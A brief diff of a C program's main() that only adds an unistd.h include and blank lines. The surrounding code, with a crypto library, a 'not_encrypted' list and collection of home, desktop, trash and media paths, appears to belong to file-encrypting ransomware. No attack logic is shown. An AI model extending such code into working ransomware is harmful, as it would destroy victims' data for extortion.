@@ -5,8 +5,10 @@
 #include"lib/func.h"
 #include"lib/crypto.h"
 #include"lib/struct.h"
+#include <unistd.h>
 
 // -lcrypto -lz -ldl -static-libgcc
+
 
 
 int main(){
@@ -17,6 +19,7 @@ int main(){
     List *not_encrypted = NULL;
 
     /* Path variables */
+
     char * home = get_home_enviroment();
     char * desktop = get_desktop_enviroment(home);
     char * username = get_username();
@@ -51,6 +54,6 @@ int main(){
     free(trash);
     free(media);
     // free(test_path);
-
+    
     return 0;
 }
